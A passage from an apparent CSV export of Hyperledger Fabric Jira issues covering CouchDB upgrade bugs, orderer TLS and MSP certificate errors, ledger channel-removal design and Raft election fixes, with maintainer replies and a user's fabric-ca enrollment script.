2020-05-08 08:21:41.950 EDT [statecouchdb] handleRequest -> WARN 003 Retrying couchdb request in 125ms. Attempt:1 Error:Get ""http://127.0.0.1:5984/"": dial tcp 127.0.0.1:5984: connect: connection refused
2020-05-08 08:21:42.077 EDT [statecouchdb] handleRequest -> WARN 004 Retrying couchdb request in 250ms. Attempt:2 Error:Get ""http://127.0.0.1:5984/"": dial tcp 127.0.0.1:5984: connect: connection refused
2020-05-08 08:21:42.329 EDT [statecouchdb] handleRequest -> WARN 005 Retrying couchdb request in 500ms. Attempt:3 Error:Get ""http://127.0.0.1:5984/"": dial tcp 127.0.0.1:5984: connect: connection refused
2020-05-08 08:21:42.831 EDT [statecouchdb] handleRequest -> WARN 006 Retrying couchdb request in 1s. Attempt:4 Error:Get ""http://127.0.0.1:5984/"": dial tcp 127.0.0.1:5984: connect: connection refused
2020-05-08 08:21:43.836 EDT [kvledger] dropStateLevelDB -> INFO 007 Dropping StateLevelDB at location [/var/hyperledger/production/ledgersData/stateLeveldb] ...if present
2020-05-08 08:21:43.836 EDT [kvledger] dropConfigHistoryDB -> INFO 008 Dropping ConfigHistoryDB at location [/var/hyperledger/production/ledgersData/configHistory]
2020-05-08 08:21:43.838 EDT [kvledger] dropBookkeeperDB -> INFO 009 Dropping BookkeeperDB at location [/var/hyperledger/production/ledgersData/bookkeeper]
2020-05-08 08:21:43.839 EDT [kvledger] dropHistoryDB -> INFO 00a Dropping HistoryDB at location [/var/hyperledger/production/ledgersData/historyLeveldb] ...if present
2020-05-08 08:21:43.840 EDT [blkstorage] DeleteBlockStoreIndex -> INFO 00b Dropping the index dir [/var/hyperledger/production/ledgersData/chains/index]... if present
2020-05-08 08:21:43.840 EDT [kvledger] upgradeFormat -> INFO 00c Upgrading ledgerProvider database to the new format 2.0{code}
This behavior is wrong. The upgrade-dbs command should fail in this case. ",,denyeart,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0ido",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,wenjian,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"09/May/20 2:46 AM;wenjian;This is a bug in DropApplicationDBs() method. When it cannot connect to CouchDB, it should return an error so that the ""upgrade-dbs"" command will return an error instead of dropping the other dbs.;;;","11/May/20 10:41 AM;wenjian;PR: [https://github.com/hyperledger/fabric/pull/1230];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Fabric upgrade documentation for CouchDB,FAB-17865,45031,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,denyeart,denyeart,08/May/20 9:32 PM,19/May/20 8:13 PM,28/Oct/23 3:10 AM,19/May/20 8:13 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,,,,,,"[https://hyperledger-fabric.readthedocs.io/en/latest/upgrade_to_newest_version.html]

""If you are using CouchDB as the state database, since it is not a local database, the peer cannot automatically drop this database. You must drop the CouchDB state database yourself.""

 

This text should be updated to indicate that upgrade-dbs has support for upgrading (dropping) CouchDB databases as of v2.2.0.",,denyeart,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17786,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idp",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,wenjian,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/May/20 12:29 AM;wenjian;PR: [https://github.com/hyperledger/fabric/pull/1241];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Operations Listen address not picking IP address & HTTPS client auth issues with /metrics,FAB-17866,45032,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,SharedMocha,SharedMocha,09/May/20 10:24 AM,12/May/20 1:50 AM,28/Oct/23 3:10 AM,12/May/20 1:50 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"*Issue 1 - Operations Listen address not picking IP address*

As a user, If I provide the IP address of my VM for operations listen to address in the docker-compose file or core.yaml/orderer.yaml according to this [doc|[https://hyperledger-fabric.readthedocs.io/en/release-2.0/operations_service.html]] I see the endpoints are not reachable. (Ex -[http://orderer0.example.com:4443/healthz)|https://orderer0.example.com:4443/metrics]

+Not working example with local IP ( I also tried with public IP)-+
- ORDERER_OPERATIONS_LISTENADDRESS=127.0.0.1:4443
- ORDERER_OPERATIONS_TLS_ENABLED=false
 
+Working example when mapping  orderer.example.com to IP in host file-+
- ORDERER_OPERATIONS_LISTENADDRESS=orderer.example.com:4443
- ORDERER_OPERATIONS_TLS_ENABLED=false
**Attaching sample file for reference which has both DNS names and IP addresses.

*Issue 2 - Client auth issues for Prometheus endpoint (/metrics)*

When ORDERER_OPERATIONS_TLS_ENABLED is set to true and 
ORDERER_OPERATIONS_TLS_CLIENTAUTHREQUIRED is set to false below endpoints work but not /metrics. 
 
[https://orderer0.example.com:4443/healthz (works)|https://orderer0.example.com:4443/metrics]
[https://orderer0.example.com:4443/version (works)|https://orderer0.example.com:4443/metrics]
[https://orderer0.example.com:4443/metrics]
 
/metrics expects CA root certs even when ORDERER_OPERATIONS_TLS_CLIENTAUTHREQUIRED is set to false. Is this the default behavior? ",,btl5037,SharedMocha,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/May/20 10:10 AM;SharedMocha;docker-compose-kafka.yml;https://jira.hyperledger.org/secure/attachment/18326/docker-compose-kafka.yml",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bu3:",,,,Unset,Unset,,"Issue 1 test -
Start orderer or peer with below settings and check if the endpoint is reachable

Settings - (You can use local or any public ip)
- ORDERER_OPERATIONS_LISTENADDRESS=127.0.0.1:4443
- ORDERER_OPERATIONS_TLS_ENABLED=false

URL -
http://127.0.0.1:4443/healthz

Issue 2 test -
Start orderer or peer with below settings and check if the endpoint is reachable

Settings in compose file (env settings)
ORDERER_OPERATIONS_TLS_ENABLED=true
ORDERER_OPERATIONS_TLS_CLIENTAUTHREQUIRED=false

URL -
https://127.0.0.1:4443/healthz ( should not work)
https://orderer0.example.com:4443/healthz (should work)
",,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,SharedMocha,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/May/20 12:11 PM;btl5037;You've told the container to listen only on its own local loopback, so when you hit [orderer0.example.com|https://orderer0.example.com:4443/metrics] Docker's DNS resolves this and then sends the request. Your container is not listening on this address. If you set it to 127.0.0.1, the only way to access the operations server is by running the commands from inside the container.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Error when orderer service started ,FAB-17867,45034,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,tiennv,tiennv,10/May/20 4:15 AM,11/May/20 7:10 PM,28/Oct/23 3:10 AM,11/May/20 7:10 PM,,,,,,,,,,,,,,,,,,,,,,,0,help-wanted,,,,,"Hi,

When I got orderer started in my machine, I got this error.

""

[orderer.common.server] initializeServerConfig -> INFO 004 Starting orderer with TLS enabled

[orderer.common.server] Main -> PANI 005 Failed validating bootstrap block: initializing channelconfig failed: could not create channel Application sub-group config: setting up the MSP manager failed: admin 0 is invalid: could not obtain certification chain: An X509 certificate with Basic Constraint: Certificate Authority equals true cannot be used as an identity

orderer1-org0 orderer[14086]: panic: Failed validating bootstrap block: initializing channelconfig failed: could not create channel Application sub-group config: setting up the MSP manager failed: admin 0 is invalid: could not obtain certification chain: An X509 certificate with Basic Constraint: Certificate Authority equals true cannot be used as an identity

"" 

Could you please give any idea about the problem.

Thanks.",,denyeart,tiennv,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01buj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,tiennv,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/May/20 7:10 PM;denyeart;It looks like you are using a CA root or intermediate certificate as the orderer admin, instead of an identity issued by a CA.

See check here:

https://github.com/hyperledger/fabric/blob/master/msp/mspimpl.go#L712-L716;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Extend the file ledger with methods for the removal of channels in the orderer,FAB-17868,45035,40571,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,tock,tock,10/May/20 6:34 PM,06/Aug/20 6:05 PM,28/Oct/23 3:10 AM,06/Aug/20 6:05 PM,,,,,,,,,,v2.x,,,,fabric-ledger,,,,,,,,,0,,,,,,"h1. General

The common/ledger package, through sub-packages blockledger & blkstorage, now supports only creating new channels and listing existing ones. In order to support the removal of orderer channels through the channel participation APIs this needs to be extended to include the removal of channels.

The ledger team is adding support for resource removal in the block storage FAB-17992. 

Here the focus is on the file ledger which consumes the block storage provider.

 
h1. API

There is one flavor -are two flavors- to this operation: 

*Remove(channelName string) error*

causes the channel folder and resources to be permanently deleted.

 

-*Archive**(channelName string) error*- (*Edit:* this will not be implemented in this task)

causes channel resources to be moved to an archival location.

Removal need to be done in an way that is resistant to crashes during the operation. For that end, as the method is invoked, a *file repo* folder is first tagged with an empty file *""channelName.remove"" or ""channelName.archive"".* Next, the prescribed action will take place. Upon restart, the ledger will detect these tags and complete the operation if it had crashed its execution. 

The file repo is developed in FAB-17960.

Crash fault tolerance for the file repo is added in FAB-18082

 
h1. Changes to current behavior

The file ledger was designed to create a ledger once and never delete it. Therefore, the `GetOrCreate()` method caches channels and never deletes them. This must be changed after the addition of `Remove`.

 
h1. Archiving (Edit: will not be implemented)

Archiving means moving (renaming) the folder to:

*LedegrArchive/channelName~<timestamp>*

 

*LedgerArchive* is a folder location defined in the ledger configuration (this need to be defined).

We use a '~' separator because it is not a legal channel name character, and include a timestamp because a channel having the same name may be created and deleted multiple times, and we want to archive all versions of it.

Archived ledger folders can only be removed manually by the administrator.
h1. Listing channels

When the ledger factory is asked to detect all the ledgers, it needs to skip folders marked with *"".remove"" or "".archive"".*

*Option:* add a method for the listing of archived ledgers. 
h1. Priority

Implementing removal is more important than implementing archiving. The task can be broken in to two respective sub-tasks. 

 ",,caod,manish-sethi,tock,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzor",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,manish-sethi,tock,wlahti,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/May/20 1:25 AM;manish-sethi;[~tock] - Yes, as a feature this makes sense. However, at the implementation level, just removing the folder in the block storage may be half job done. We would need to clean up the data from block storage index as well.
We have been thinking of implementing the similar function at the peer level. This would include the code for the ledger at the order as well. FAB-17801 is the jira for this. So, I think that we can follow one of the following strategy
- Wait for FAB-17801 and it would cover the most of the code for this Jira.
- If you want to take up the ledger code at the orderer, we can split FAB-17801 and you can take up this portion.
So, the intent is to avoid duplicate effort and delete the data thoroughly.;;;","12/May/20 3:11 PM;tock;[~manish-sethi] - Thanks for taking note to the duplication. Certainly, we want to avoid duplicate efforts and coordinate our actions on this one.

I browsed the set of tasks below FAB-17801, and most of them seem specific to the peer except this one: FAB-17802 (which is a sub-task of FAB-17787) which deals with deleting the blocks and the block indexes. 

I admit that the definition here is limited to the use-case in the orderer... It seems we'll get everything we need at the orderer if we just implement  FAB-17802, is that right?

What is the timeline of the FAB-17802 story? That will affect the decision whether to wait or not. ( [~wlahti] [~caod] ).;;;","12/May/20 11:50 PM;manish-sethi;[~tock] Yes, FAB-17802 is the correct sub-task and it is under the broader story of peer, because the code in fabric/common/ledger is shared between the peer and the orderer. Only difference is that the index configurations that are passed to this code differ for the peer component from the orderer component, the peer configurations being a super-set of the orderer configurations.

In a way, if we implement for the peer, keeping all index entries in mind, this would cover for the orderer as well - except the specific, higher level API/command line.

On the timelines, I'll discuss with the team and update you here and based on that we can take a call. In the meanwhile, can you share your timelines for this dependency?
;;;","16/Jul/20 11:08 PM;wlahti;PR for remove: https://github.com/hyperledger/fabric/pull/1609;;;","06/Aug/20 5:48 PM;tock;The ""*archive*"" flavor is removed from this task (edited out of the description).  Here are the arguments.

 

This archiving part of the story is pretty low priority. I am not convinced that we need it. Especially since a ""backup"" exists at other orderers, and ""restore"" is automatic when rejoining a channel. Moving the ledger to a side location is just a half measure - as recovery would have to manual by the admin - the admin will copy files to the right location and will have to restart the orderer.

 

There are more appealing alternatives: Just `{{stop`}} the runtime resources, mark the channel somehow - say by adding a marker file in the file repo, e.g. "".stopped"" - and simply keeping the ledger content where it is. The channel would be removed from the channels list and ignored on restart (moved to a list of ""stopped"" chains).
The admin would be able to restart the channel with a respective `{{start`}} command or {{`rejoin}}` ({{update}}) by supplying a new join block. If the join block is further along the chain, the orderer will onboard the missing blocks and continue as usual i.e. as member or follower. The admin would also be able `{{remove}}` it completely.There are some tricky issues to sort out, however, the main idea is to back-off archiving for the first release of this API, and possibly extend it with `{{stop`}} , `{{start`}} and `{{update}}/{{rejoin}}` in the future. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Orderer replaces TLS CA root certs with same subject,FAB-17869,45036,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,kopaygorodsky,kopaygorodsky,10/May/20 10:07 PM,01/Jul/20 7:16 PM,28/Oct/23 3:10 AM,11/May/20 9:51 AM,,,,,,,,,,v2.2.0,,,,,,,,,,,,,0,,,,,,"I have multiple orgs added to system channel Orderer group in genesis block I'm not able to connect to my ordering nodes (mutual tls enabled because of raft). In ordering logs I see `TLS handshake failed with error tls: failed to verify client's certificate: x509: certificate signed by unknown authority (possibly because of ""x509: ECDSA verification failure"" while trying to verify candidate authority certificate ""fabric-ca-server"") `.
When I start with 1 org and then add orgs with channel update - it works, but after a few mins it throws same error again. 
I figured out the problem by reading orderer source code. The problem was in CRS subjects of all CAs, they have same CN + OU which means subjects are equal. 
https://github.com/hyperledger/fabric/blob/2c2274d0519a1ce1eba596ff0a43636dce64d926/internal/pkg/comm/server.go#L271 it happens because of key in this map.  CaRoot certs are getting replaced when updating root CAs for channel.",,kopaygorodsky,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01buz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),kopaygorodsky,mastersingh24,yacovm,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/May/20 12:07 AM;yacovm;https://github.com/hyperledger/fabric/pull/1229 

/cc [~jyellick] [~mastersingh24] ;;;","14/May/20 5:49 PM;mastersingh24;While I'm ok with this change, there was a reason for this and while it may seem artificial, some people actual do look at the issuer (which ends up being the Subject DN) when comparing certificates and I did not see any reason why there should be duplicate issuer subjects in a single network. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Introduce snapshot file creator and reader functions and use these to generate snapshot files for TXIDs,FAB-17870,45037,44705,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,11/May/20 1:12 PM,14/May/20 7:23 AM,28/Oct/23 3:10 AM,14/May/20 7:23 AM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"Adds reusable functions for creating and reading the snapshot files. These functions helpe in encoding/decoding data to/from snapshot files and compute the hash of the file contents during exporting the content to the snapshot files. These are expected to be used by various components that would generate or consume the snapshot files, such as blockstorage and statedb. Also, use these functions for generating the snapshot files for TXIDs.",,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bv7:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support returning an unsigned config update envelope,FAB-17871,45038,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,caod,caod,11/May/20 11:02 PM,13/May/20 2:47 AM,28/Oct/23 3:10 AM,13/May/20 2:47 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config api I would like to have the flexibility of not having to require having signing identities at time of generating the config update so that I can take the config update transaction and sign it via the peer channel commands instead.

 

*Acceptance*

I can call a function that returns a cb.ConfigUpdateEnvelope without requiring any signing identities.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzoi",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Refactor NewCreateChannelTx to allow attaching ConfigSignatures and signing the envelope,FAB-17872,45043,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,12/May/20 6:52 AM,13/May/20 2:47 AM,28/Oct/23 3:10 AM,13/May/20 2:47 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"With FAB-17871 in mind, we can refactor NewChannelCreateTx to return a *cb.ConfigUpdate instead of a *cb.Envelope. This will allow us to attach signatures to the inner ConfigUpdateEnvelope as well as use the signing identity to subsequently sign the envelope.",,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzok",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document how to build your own custom policies,FAB-17873,45044,,Documentation,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,pandrejko,pandrejko,12/May/20 7:58 AM,12/May/20 7:58 AM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,"As a third extension to the create a channel tutorial, it would be good to document how to decide on, plan for and build custom policies for your network rather than using the default policies.",,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrhm:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Messages in etcdraft UTs should be delivered in order,FAB-17874,45045,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,guoger,guoger,guoger,12/May/20 10:59 AM,11/May/21 11:18 PM,28/Oct/23 3:10 AM,11/May/21 11:18 PM,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,,,,,,"Today in etcdraft UTs, whenever a message is sent to a node, it calls {{Consensus(req, sender)}} on that instance in a **new goroutine**. Therefore, messages are delivered out of order due to Go scheduler. This wouldn't cause much problem in real network as Raft is resilient enough to such faults. However, in UT, we normally do not send extra ticks for a node to recover.

We could use a channel to buffer ingress messages, which are consumed in original order",,guoger,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bwb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),guoger,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/May/21 11:18 PM;guoger;It seems that etcdraft UTs have survived ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Raft may fail the leader election,FAB-17875,45046,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,baohua,baohua,baohua,12/May/20 1:16 PM,15/Jun/20 2:21 PM,28/Oct/23 3:10 AM,15/Jun/20 2:21 PM,v1.4.2,v1.4.3,v1.4.4,v1.4.5,v1.4.6,v2.0.0,v2.0.1,v2.1.0,,v2.2.0,,,,,,,,,,,,,0,,,,,,"This is a critical bug that affect both v1.4.x and v2.x (enabled raft consensus by default).

When a OSN was removed and rejoined the channel later, the channel will fail to elect a leader and cannot recover. 

This is because the OSN cannot get a correct raft id after re-joining.

The solution should be letting the OSN re-calculate its raft id.",,baohua,warm3snow,yacovm,ymlbright,,,,,,,,,,,,,,,,,,FAB-17951,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bwj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),baohua,warm3snow,yacovm,ymlbright,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/May/20 7:03 AM;baohua;[https://github.com/hyperledger/fabric/pull/1311];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
An authentication handshake failed need help!,FAB-17876,45047,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Invalid: Works as Expected,,ritel126,ritel126,12/May/20 4:00 PM,26/Dec/20 7:21 PM,28/Oct/23 3:10 AM,26/Dec/20 7:21 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"I want to create a msp by fabric-ca. But when I set tls enabled, the Orderers handshake with each others failed. Here is the script of creating orderers!

 

{color:#0747a6}fabric-ca-client enroll -M ./crypto-config/ordererOrganizations/h3c.com/tlstmp -u http://admin:[adminpw@0.0.0.0|mailto:adminpw@0.0.0.0]:7056 --home ./fabric-ca-client{color}

{color:#0747a6} {color}{color:#0747a6}fabric-ca-client affiliation list -M ./crypto-config/ordererOrganizations/h3c.com/tlstmp -u http://admin:[adminpw@0.0.0.0|mailto:adminpw@0.0.0.0]:7056 --home ./fabric-ca-client{color}

{color:#0747a6}fabric-ca-client affiliation remove --force org1 -M ./crypto-config/ordererOrganizations/h3c.com/tlstmp -u http://admin:[adminpw@0.0.0.0|mailto:adminpw@0.0.0.0]:7056 --home ./fabric-ca-client{color}

{color:#0747a6}fabric-ca-client affiliation remove --force org2 -M ./crypto-config/ordererOrganizations/h3c.com/tlstmp -u http://admin:[adminpw@0.0.0.0|mailto:adminpw@0.0.0.0]:7056 --home ./fabric-ca-client{color}

{color:#0747a6}fabric-ca-client affiliation add com -M ./crypto-config/ordererOrganizations/h3c.com/tlstmp -u http://admin:[adminpw@0.0.0.0|mailto:adminpw@0.0.0.0]:7056 --home ./fabric-ca-client{color}

{color:#0747a6}fabric-ca-client affiliation add com.h3c -M ./crypto-config/ordererOrganizations/h3c.com/tlstmp -u http://admin:[adminpw@0.0.0.0|mailto:adminpw@0.0.0.0]:7056 --home ./fabric-ca-client{color}

{color:#0747a6} {color}{color:#0747a6}fabric-ca-client register --id.name [Admin@h3c.com|mailto:Admin@h3c.com] --id.type client --id.affiliation ""com.h3c"" --id.attrs '""hf.Registrar.Roles=client,orderer,peer,user"",""hf.Registrar.DelegateRoles=client,orderer,peer,user"",hf.Registrar.Attributes=*,hf.GenCRL=true,hf.Revoker=true,hf.AffiliationMgr=true,hf.IntermediateCA=true,role=admin:ecert' --id.secret=123456 --csr.cn=h3c.com --csr.hosts=['h3c.com'] -M ./crypto-config/ordererOrganizations/h3c.com/tlstmp -u http://admin:[adminpw@0.0.0.0|mailto:adminpw@0.0.0.0]:7056 --home ./fabric-ca-client{color}

{color:#0747a6}fabric-ca-client enroll -d --enrollment.profile tls -u http://[Admin@h3c.com|mailto:Admin@h3c.com]:[123456@0.0.0.0|mailto:123456@0.0.0.0]:7056 --csr.cn=h3c.com --csr.hosts=['h3c.com'] -M ./crypto-config/ordererOrganizations/h3c.com/users/[Admin@h3c.com|mailto:Admin@h3c.com]/tlstmp --home ./fabric-ca-client{color}

{color:#0747a6} {color}

{color:#0747a6}mkdir  ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/users/[Admin@h3c.com|mailto:Admin@h3c.com]/tls/{color}

{color:#0747a6}cp ./server_2/ca-chain.pem ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/users/[Admin@h3c.com|mailto:Admin@h3c.com]/tls/ca.crt{color}

{color:#0747a6}cp ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/users/[Admin@h3c.com|mailto:Admin@h3c.com]/tlstmp/signcerts/cert.pem ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/users/[Admin@h3c.com|mailto:Admin@h3c.com]/tls/client.crt{color}

{color:#0747a6}cp ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/users/[Admin@h3c.com|mailto:Admin@h3c.com]/tlstmp/keystore/*_sk ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/users/[Admin@h3c.com|mailto:Admin@h3c.com]/tls/client.key{color}

{color:#0747a6}cp -r ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/users/[Admin@h3c.com|mailto:Admin@h3c.com]/tlstmp/tlscacerts ./fabric-ca-client/crypto-config/ordererOrganizations/h3c.com/msp{color}

